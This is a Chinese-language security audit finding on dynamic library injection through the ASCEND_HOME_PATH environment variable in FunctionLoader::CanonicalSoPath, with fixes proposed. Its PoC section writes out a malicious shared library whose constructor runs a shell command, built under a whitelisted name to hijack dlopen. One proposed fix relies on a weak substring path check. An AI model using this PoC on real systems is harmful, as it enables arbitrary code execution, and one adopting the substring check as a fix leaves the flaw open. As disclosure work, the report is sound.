# VULN-SEC-LIB-001：CanonicalSoPath环境变量控制dlopen致库注入

## 基本信息
- **漏洞ID**: VULN-SEC-LIB-001
- **类型**: Library Injection (库注入)
- **严重性**: Critical
- **CWE**: CWE-426 (Untrusted Search Path)
- **置信度**: 85
- **验证状态**: CONFIRMED

## 漏洞描述

FunctionLoader::CanonicalSoPath() 函数通过环境变量 `ASCEND_HOME_PATH` 确定动态库加载路径。攻击者若能控制此环境变量，可重定向库加载至恶意路径，在 dlopen() 调用时执行任意代码。

现有库名白名单检查仅验证库文件名，不验证路径本身，无法阻止路径注入攻击。代码中存在 CheckCharValid() 函数可过滤危险字符，但从未被调用。

## 攻击向量

### 入口点
- **位置**: `csrc/common/function_loader.cpp:58`
- **代码**: `char *ascendHomePath = std::getenv("ASCEND_HOME_PATH");`
- **类型**: 环境变量读取（外部可控输入）

### 攻击路径
```
1. 攻击者设置 ASCEND_HOME_PATH 环境变量
   └─ 例如: ASCEND_HOME_PATH=/tmp/malicious

2. getenv() 读取环境变量 (line 58)
   └─ 返回攻击者控制的路径字符串

3. 字符串拼接构造加载路径 (line 62)
   └─ soPath = ASCEND_HOME_PATH + "/lib64/" + soName_
   └─ 例如: /tmp/malicious/lib64/libascendcl.so

4. 路径处理 (line 63)
   └─ RelativeToAbsPath(): 相对路径转绝对路径
   └─ RealPath(): 解析符号链接，跟随至最终目标

5. 文件存在性检查 (line 64)
   └─ FileExist() + FileReadable(): 仅检查文件是否存在和可读
   └─ 不验证文件来源或完整性

6. dlopen() 加载库 (line 74)
   └─ 加载攻击者控制的恶意库
   └─ 库的初始化代码自动执行
```

### 前置条件
| 条件 | 要求 | 说明 |
|------|------|------|
| 环境变量控制 | 攻击者能设置 ASCEND_HOME_PATH | 通过容器环境、共享环境或进程注入 |
| 文件写入能力 | 在指定路径创建恶意库文件 | 需要文件系统写入权限 |
| 库名匹配 | 使用白名单内的库名 | libascend_hal.so, libascendcl.so 等 |

## 利用分析

### 利用可行性

#### 可达性分析
- **直接可达**: 环境变量在进程启动时读取，无需用户交互
- **触发条件**: 任何调用 FunctionLoader::Get() 的代码路径
- **调用链**: FunctionRegister::Get() → FunctionLoader::Get() → CanonicalSoPath() → dlopen()

#### 可控性分析
- **完全可控**: ASCEND_HOME_PATH 的值完全由攻击者决定
- **路径注入**: 可注入任意路径，包括 `/tmp`、`/home/user` 等
- **符号链接绕过**: RealPath() 会跟随符号链接，攻击者可创建指向恶意库的链接

#### 白名单绕过分析
```cpp
// 白名单检查 - 仅验证文件名
static const std::set<std::string> soNameList = {
    "libascend_hal.so",
    "libascendalog.so",
    "libascendcl.so",
    "libhccl.so",
    "libprofapi.so",
};
if (soNameList.find(soName_) == soNameList.end()) {
    return "";  // 文件名不在白名单则拒绝
}
```
**问题**: 白名单仅检查 `soName_`（如 `libascendcl.so`），不检查完整路径。
攻击者可以在恶意目录下创建同名文件：`/tmp/malicious/lib64/libascendcl.so`

#### CheckCharValid 未调用
```cpp
// utils.cpp:137-146 - 存在但从未使用
bool Utils::CheckCharValid(const std::string &str)
{
    for (auto &item: INVALID_CHAR) {
        if (str.find(item.first) != std::string::npos) {
            MSPTI_LOGE("The path contains invalid character: %s.", item.second.c_str());
            return false;
        }
    }
    return true;
}
```
此函数可过滤路径中的危险字符（如 `../`, `$`, `|` 等），但在 CanonicalSoPath() 中从未调用。

### 利用难度评估
| 维度 | 等级 | 说明 |
|------|------|------|
| 攻击复杂度 | Low | 仅需设置环境变量并创建恶意库 |
| 所需权限 | Medium | 需要文件写入能力和环境变量设置能力 |
| 用户交互 | None | 无需用户交互，库加载自动触发 |
| 利用成功率 | High | 一旦条件满足，攻击必定成功 |

### 漏洞影响

#### 直接影响
- **任意代码执行**: 通过 dlopen() 加载恶意库，库的构造函数自动执行
- **权限维持**: 恶意代码可在进程生命周期内持续运行
- **进程劫持**: 可修改进程行为、窃取数据、植入后门

#### 间接影响
- **供应链攻击**: 攻击者可替换关键库函数实现
- **数据泄露**: 可读取进程内存中的敏感数据
- **权限提升**: 若进程有特权，恶意库继承特权
- **横向移动**: 在多节点环境中，可影响所有使用相同环境配置的节点

## PoC 构建思路

### 环境准备
```bash
# 1. 创建恶意库目录
mkdir -p /tmp/evil_lib/lib64

# 2. 编写恶意库代码
cat > evil_lib.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
void evil_init() {
    printf("[EVIL] Library injected successfully!\n");
    // 执行任意代码
    system("id > /tmp/pwned.txt");
}
EOF

# 3. 编译恶意库（使用白名单中的库名）
gcc -shared -fPIC -o /tmp/evil_lib/lib64/libascendcl.so evil_lib.c

# 4. 设置环境变量
export ASCEND_HOME_PATH=/tmp/evil_lib
```

### 触发漏洞
```cpp
// 调用任何需要加载 libascendcl.so 的函数
// 例如通过 FunctionRegister::Get("ascendcl", "someFunction")
// dlopen() 将加载 /tmp/evil_lib/lib64/libascendcl.so
// 恶意库的构造函数自动执行
```

### 验证成功
```bash
# 检查恶意代码是否执行
cat /tmp/pwned.txt
# 应显示当前进程的用户权限信息
```

## 修复建议

### 立即修复方案

#### 1. 调用 CheckCharValid 进行路径验证
```cpp
std::string FunctionLoader::CanonicalSoPath()
{
    // ... 白名单检查 ...
    
    char *ascendHomePath = std::getenv("ASCEND_HOME_PATH");
    if (ascendHomePath == nullptr || ascendHomePath[0] == '\0') {
        return soName_;
    }
    
    // 新增: 验证路径字符有效性
    if (!Utils::CheckCharValid(ascendHomePath)) {
        std::cout << "ASCEND_HOME_PATH contains invalid characters." << std::endl;
        return "";
    }
    
    auto soPath = std::string(ascendHomePath) + "/lib64/" + soName_;
    // ...
}
```

#### 2. 使用绝对路径白名单
```cpp
// 定义允许的安装路径
static const std::set<std::string> allowedPaths = {
    "/usr/local/Ascend",
    "/opt/Ascend",
    "/home/ascend"
};

// 验证 ASCEND_HOME_PATH 是否在白名单中
if (allowedPaths.find(ascendHomePath) == allowedPaths.end()) {
    std::cout << "ASCEND_HOME_PATH not in allowed paths." << std::endl;
    return "";
}
```

#### 3. 使用可信路径验证
```cpp
// 验证最终路径是否在预期目录树内
std::string canonicalPath = Utils::RealPath(soPath);
if (canonicalPath.find("/Ascend/") == std::string::npos &&
    canonicalPath.find("/usr/local/") == std::string::npos) {
    std::cout << "Library path outside trusted directories." << std::endl;
    return "";
}
```

### 长期改进建议

1. **移除环境变量依赖**: 使用编译时确定的安装路径或配置文件
2. **库完整性校验**: 加载前验证库文件的数字签名或哈希值
3. **沙箱隔离**: 在受限环境中加载库，限制其权限
4. **审计日志**: 记录所有库加载路径，便于异常检测

## 参考
- CWE-426: https://cwe.mitre.org/data/definitions/426.html
- CWE-99: https://cwe.mitre.org/data/definitions/99.html (相关：文件资源控制不当)
- ATT&CK T1574.006: Dynamic Linker Hijacking